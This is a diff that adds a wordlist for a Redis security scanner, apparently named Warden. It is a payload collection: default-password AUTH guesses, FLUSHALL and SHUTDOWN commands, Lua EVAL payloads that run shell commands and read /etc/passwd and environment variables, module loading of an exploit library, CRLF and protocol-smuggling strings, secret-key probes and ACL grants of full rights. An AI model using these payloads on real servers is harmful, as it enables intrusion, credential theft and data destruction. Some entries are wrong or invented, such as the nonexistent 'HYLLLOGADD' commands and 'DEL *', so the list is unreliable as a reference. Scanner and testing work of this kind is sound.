@@ -1,0 +1,499 @@
+# Redis Security Scanner Wordlist
+# For Warden v0.8.0 Enterprise Edition
+#
+# Categories:
+# - Authentication bypass
+# - Dangerous commands
+# - Information disclosure
+# - Lua script injection
+# - Module loading
+# - Protocol injection
+
+# ============================================
+# AUTHENTICATION TESTS
+# ============================================
+
+# No auth / default credentials
+AUTH
+AUTH default
+AUTH
+AUTH redis
+AUTH root
+AUTH admin
+AUTH password
+AUTH redis:redis
+AUTH admin:admin
+AUTH root:root
+AUTH test:test
+AUTH guest:guest
+AUTH default:default
+AUTH 123456
+AUTH password123
+AUTH admin123
+AUTH root123
+
+# Common weak passwords
+AUTH admin123
+AUTH password1
+AUTH pass123
+AUTH redis123
+AUTH root123
+AUTH test123
+AUTH qwerty
+AUTH 12345678
+AUTH adminadmin
+AUTH rootroot
+
+# Empty password attempts
+AUTH ""
+AUTH ''
+AUTH "\n"
+AUTH "\r\n"
+AUTH "\x00"
+
+# ============================================
+# DANGEROUS COMMANDS - DATA DELETION
+# ============================================
+
+FLUSHALL
+FLUSHALL async
+FLUSHALL SYNC
+FLUSHDB
+FLUSHDB async
+FLUSHDB SYNC
+
+# Data manipulation
+DEL *
+DEL key:*
+DEL user:*
+DEL config:*
+DEL secret:*
+DEL auth:*
+DEL session:*
+DEL token:*
+
+# ============================================
+# DANGEROUS COMMANDS - CONFIGURATION
+# ============================================
+
+CONFIG SET *
+CONFIG SET dir
+CONFIG SET dbfilename
+CONFIG SET requirepass
+CONFIG SET masterauth
+CONFIG SET appendonly
+CONFIG SET save
+CONFIG SET notify-keyspace-events
+
+CONFIG GET *
+CONFIG GET dir
+CONFIG GET dbfilename
+CONFIG GET requirepass
+CONFIG GET masterauth
+CONFIG GET bind
+CONFIG GET port
+CONFIG GET protected-mode
+CONFIG GET maxmemory
+CONFIG GET appendonly
+CONFIG GET save
+
+CONFIG REWRITE
+CONFIG RESETSTAT
+
+# ============================================
+# DANGEROUS COMMANDS - LUA SCRIPTING (RCE)
+# ============================================
+
+EVAL "return 'Hello'" 0
+EVAL "return redis.call('KEYS', '*')" 0
+EVAL "local info = redis.call('CONFIG', 'GET', 'requirepass'); return info" 0
+EVAL "return io.popen('ls'):read('*a')" 0
+EVAL "return os.execute('whoami')" 0
+EVAL "return package.loaded['io']" 0
+EVAL "return require('os')" 0
+EVAL "return loadstring('return io.popen(\\\"id\\\"):read(\\\"*a\\\")')()" 0
+
+EVAL "local cmd='id';local f=io.popen(cmd,'r');local output=f:read('*all');f:close();return output" 0
+EVAL "local f=io.open('/etc/passwd','r');local c=f:read('*a');f:close();return c" 0
+EVAL "os.execute('cat /etc/passwd')" 0
+
+# Shell script execution via Lua
+EVAL "local i=require('io');local p=i.popen('sh -c whoami');return p:read('*a')" 0
+EVAL "return io.open('/proc/self/environ'):read('*a')" 0
+
+# Write files via Lua
+EVAL "local f=io.open('/tmp/evil.lua','w');f:write('malicious');f:close()" 0
+EVAL "local f=io.write('/tmp/test','pwned')" 0
+
+EVALSHA 0 0
+
+# ============================================
+# DANGEROUS COMMANDS - PERSISTENCE
+# ============================================
+
+SAVE
+BGSAVE
+BGREWRITEAOF
+
+# ============================================
+# DANGEROUS COMMANDS - SHUTDOWN
+# ============================================
+
+SHUTDOWN
+SHUTDOWN NOSAVE
+SHUTDOWN SAVE
+DEBUG SEGFAULT
+
+# ============================================
+# INFORMATION DISCLOSURE
+# ============================================
+
+INFO
+INFO default
+INFO all
+INFO server
+INFO clients
+INFO memory
+INFO persistence
+INFO stats
+INFO replication
+INFO cpu
+INFO commandstats
+INFO cluster
+INFO keyspace
+INFO modules
+INFO defaults
+
+# Client enumeration
+CLIENT LIST
+CLIENT GETNAME
+CLIENT SETNAME
+CLIENT KILL
+CLIENT PAUSE
+
+# Monitor command - sniff all commands
+MONITOR
+
+# ============================================
+# KEY ENUMERATION
+# ============================================
+
+KEYS *
+KEYS user:*
+KEYS pass:*
+KEYS auth:*
+KEYS token:*
+KEYS session:*
+KEYS config:*
+KEYS secret:*
+KEYS admin:*
+KEYS api:*
+KEYS password:*
+KEYS credential:*
+KEYS key:*
+KEYS *
+KEYS ?
+KEYS [a]*
+KEYS \[a\]*
+KEYS \\[a\\]*
+
+SCAN 0
+SCAN 0 COUNT 1000
+SCAN 0 MATCH user:*
+SCAN 0 MATCH auth:*
+SCAN 0 MATCH secret:*
+SCAN 0 MATCH *
+
+# ============================================
+# DATA EXTRACTION
+# ============================================
+
+GET *
+GET user
+GET pass
+GET admin
+GET password
+GET secret
+GET key
+GET token
+GET config
+GET flag
+GET api_key
+GET apikey
+GET access_token
+GET refresh_token
+GET session_id
+GET session
+
+TYPE *
+TYPE user
+TYPE password
+TYPE secret
+
+STRLEN user
+STRLEN password
+TTL *
+LRANGE user 0 -1
+SRANDMEMBER *
+HGETALL *
+HGETALL user:*
+HGETALL config:*
+ZRANGE * 0 -1
+ZRANGE auth:* 0 -1 WITHSCORES
+
+# ============================================
+# MODULE LOADING (RCE via modules)
+# ============================================
+
+MODULE LIST
+MODULE LOAD
+MODULE LOAD /path/to/module.so
+MODULE LOAD /tmp/exploit.so
+MODULE LOAD ./module.so
+MODULE UNLOAD
+MODULE HELP
+
+# System commands via modules
+MODULE LOAD sys.so
+MODULE LOAD system.so
+
+# ============================================
+# REPLICA / SYNC ATTACKS
+# ============================================
+
+SYNC
+PSYNC
+REPLCONF
+REPLCONF listening-port
+REPLCONF capa
+REPLCONF ACK
+
+# Replica manipulation
+SLAVEOF
+SLAVEOF NO ONE
+SLAVEOF 127.0.0.1 6379
+REPLICAOF
+
+# ============================================
+# PROTOCOL INJECTION
+# ============================================
+
+# CRLF injection
+*\r\n
+*\r\n\r\n
+KEYS *\r\nQUIT
+INFO\r\nSET x 1
+
+# Command injection via parameters
+CONFIG GET *\nSET
+CONFIG GET *\rSET
+EVAL "return 1" 0\nFLUSHALL
+
+# Bulk string injection
+$4\nevil
+$-1
+$0
+*
+
+# Array injection
+*1\n$6\nFLUSHALL
+*2\n$4\nEVAL\n$12\nreturn 1\n0
+
+# ============================================
+# PUB/SUB ABUSE
+# ============================================
+
+PUBLISH
+SUBSCRIBE
+PSUBSCRIBE
+PUBSUB
+PUBSUB CHANNELS
+PUBSUB NUMSUB
+PUBSUB NUMPAT
+
+# ============================================
+# TRANSACTION ABUSE
+# ============================================
+
+MULTI
+EXEC
+DISCARD
+WATCH
+UNWATCH
+
+# ============================================
+# SCRIPT DEBUGGING
+# ============================================
+
+SCRIPT DEBUG
+SCRIPT DEBUG YES
+SCRIPT DEBUG SYNC
+SCRIPT DEBUG NO
+SCRIPT FLUSH
+SCRIPT LOAD
+SCRIPT EXISTS
+SCRIPT KILL
+
+# ============================================
+# CLUSTER COMMANDS
+# ============================================
+
+CLUSTER INFO
+CLUSTER NODES
+CLUSTER MEET
+CLUSTER RESET
+CLUSTER ADDSLOTS
+CLUSTER DELSLOTS
+CLUSTER FAILOVER
+CLUSTER REPLICATE
+CLUSTER SETSLOT
+CLUSTER KEYSLOT
+
+# ============================================
+# BINARY DATA / SMUGGLING
+# ============================================
+
+\x00\x01\x02\x03
+\xff\xfe\xfd\xfc
+# Redis protocol magic
+*1\r\n$4
+*0\r\n
+
+# ============================================
+# MISC DANGEROUS COMMANDS
+# ============================================
+
+DEBUG OBJECT
+DEBUG RELOAD
+SWAPDB
+SWAPDB 0 1
+MIGRATE
+RESTORE
+DUMP
+MEMORY DOCTOR
+MEMORY STATS
+MEMORY PURGE
+
+# ============================================
+# COMMON KEY NAMES TO PROBE
+# ============================================
+
+GET env
+GET environment
+Get .env
+GET database
+Get db
+Get connection
+Get conn
+Get credentials
+Get creds
+Get private_key
+Get privatekey
+Get ssh_key
+Get sshkey
+
+# Web app specific
+GET csrf_token
+Get xsrf_token
+Get auth_token
+Get bearer_token
+Get jwt
+Get session_token
+Get cookie_secret
+Get secret_key
+
+# ============================================
+# LUA SANDBOX ESCAPE ATTEMPTS
+# ============================================
+
+EVAL "return _G" 0
+EVAL "return getmetatable('')" 0
+EVAL "return package" 0
+EVAL "return os" 0
+EVAL "return io" 0
+EVAL "return debug" 0
+EVAL "return load" 0
+EVAL "return loadstring" 0
+EVAL "return dofile" 0
+EVAL "return require" 0
+
+# Lua 5.1 specific escapes
+EVAL "return getfenv()" 0
+EVAL "return setfenv(1,{})" 0
+EVAL "debug.debug()" 0
+
+# ============================================
+# TIMING ATTACKS
+# ============================================
+
+# Commands for DoS/timing analysis
+DEBUG SLEEP 10
+SLOWLOG GET
+SLOWLOG LEN
+SLOWLOG RESET
+
+BLPOP test 10
+BRPOP test 10
+BRPOPLPUSH test test2 10
+
+# ============================================
+# ACL EXPLOITATION (Redis 6+)
+# ============================================
+
+ACL WHOAMI
+ACL LIST
+ACL GETUSER
+ACL SETUSER
+ACL DELUSER
+ACL GENPASS
+ACL LOG
+ACL SAVE
+ACL LOAD
+
+ACL SETUSER default on
+ACL SETUSER default off
+ACL SETUSER default +@all
+ACL SETUSER default >password
+ACL SETUSER default ~*
+
+# ============================================
+# FUNCTION COMMANDS (Redis 7+)
+# ============================================
+
+FUNCTION LIST
+FUNCTION LOAD
+FUNCTION DELETE
+FUNCTION FLUSH
+FUNCTION DUMP
+FUNCTION RESTORE
+
+# ============================================
+# MISC/EDGE CASES
+# ============================================
+
+PING
+ECHO
+ECHO injection
+RANDOMKEY
+EXISTS
+Dbsize
+LASTSAVE
+TIME
+SORT
+SORT *
+TOUCH
+OBJECT ENCODING
+OBJECT IDLETIME
+OBJECT REFCOUNT
+GEOHASH
+GEOPOS
+GEODIST
+BITCOUNT
+BITOP
+BITFIELD
+PFADD
+PFCOUNT
+PFMERGE
+HYLLLOGADD
+HYLLLOGCOUNT
+HYLLLOGMERGE
